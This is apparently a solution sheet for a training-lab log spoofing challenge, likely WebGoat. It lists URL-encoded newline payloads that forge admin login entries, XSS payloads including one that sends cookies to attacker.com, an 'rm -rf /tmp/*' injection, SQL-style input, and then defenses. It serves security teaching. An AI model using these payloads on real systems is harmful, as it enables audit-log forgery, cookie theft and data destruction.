====================================
LOG SPOOFING ATTACK - SOLUTION
====================================

CHALLENGE: Make it look like "admin" successfully logged in

VULNERABILITY: The application logs user input without sanitization,
allowing us to inject newlines and fake log entries.

====================================
BASIC ATTACK (Make admin login succeed)
====================================

PAYLOAD 1 (Windows/URL-encoded newlines):
test%0D%0ALogin succeeded for username: admin

PAYLOAD 2 (Unix newlines):
test%0ALogin succeeded for username: admin

PAYLOAD 3 (Double newline for spacing):
test%0D%0A%0D%0ALogin succeeded for username: admin

PAYLOAD 4 (With timestamp-like format):
test%0D%0A[2025-12-14 10:30:45] Login succeeded for username: admin

====================================
HOW IT WORKS:
====================================

When you submit: test%0D%0ALogin succeeded for username: admin

The log file will show:
Login failed for username: test
Login succeeded for username: admin

This makes it look like admin logged in successfully!

====================================
ADVANCED ATTACK (Add script to log)
====================================

PAYLOAD 5 (XSS in logs):
test%0D%0ALogin succeeded for username: admin%0D%0A<script>alert('XSS')</script>

PAYLOAD 6 (Command injection attempt):
test%0D%0ALogin succeeded for username: admin%0D%0A; rm -rf /tmp/*

PAYLOAD 7 (SQL-like injection):
test%0D%0ALogin succeeded for username: admin' OR '1'='1

PAYLOAD 8 (More sophisticated XSS):
test%0D%0ALogin succeeded for username: admin%0D%0A<script>document.location='http://attacker.com?cookie='+document.cookie</script>

====================================
WHAT TO TRY:
====================================

1. BASIC CHALLENGE:
   Username: test%0D%0ALogin succeeded for username: admin
   Password: (anything)
   
   Submit and check if the red log area shows:
   "Login succeeded for username: admin"

2. ADVANCED CHALLENGE:
   Username: test%0D%0ALogin succeeded for username: admin%0D%0A<script>alert('Hacked')</script>
   Password: (anything)
   
   Submit and check if script tag appears in logs

====================================
WHY THIS IS DANGEROUS:
====================================

1. AUDIT LOG POISONING:
   - Attacker can create fake audit trails
   - Makes forensic investigation unreliable
   - Can cover tracks by injecting fake entries

2. LOG-BASED MONITORING BYPASS:
   - SIEM systems might parse logs incorrectly
   - Fake successful logins can trigger false alerts
   - Or hide real attacks among fake entries

3. LOG FILE ATTACKS:
   - If logs are viewed in a web interface: XSS
   - If logs are processed by scripts: Command injection
   - If logs are imported to database: SQL injection

4. COMPLIANCE VIOLATIONS:
   - Unreliable audit logs
   - Cannot prove user actions
   - Regulatory compliance issues

====================================
DEFENSE MECHANISMS:
====================================

1. SANITIZE USER INPUT:
   - Remove/escape newline characters (\r, \n)
   - Remove control characters
   - Use allowlisting for valid characters

2. STRUCTURED LOGGING:
   - Use JSON or other structured formats
   - Separate fields (not free-text concatenation)
   - Example: {"event":"login_failed","username":"admin","time":"..."}

3. ENCODE OUTPUT:
   - HTML-encode if logs viewed in browser
   - Use parameterized queries if logs go to database
   - Escape shell metacharacters if processed by scripts

4. LOG INTEGRITY:
   - Use write-once log storage
   - Cryptographic signatures on log entries
   - Centralized logging with tamper detection

====================================
READY-TO-USE PAYLOADS:
====================================

Copy these directly into the username field:

SIMPLE:
test%0D%0ALogin succeeded for username: admin

WITH SPACING:
test%0D%0A%0D%0ALogin succeeded for username: admin

WITH SCRIPT:
test%0D%0ALogin succeeded for username: admin%0D%0A<script>alert('Log Injection')</script>

MULTIPLE FAKE ENTRIES:
test%0D%0ALogin succeeded for username: admin%0D%0ALogin succeeded for username: root%0D%0ALogin succeeded for username: webgoat

====================================
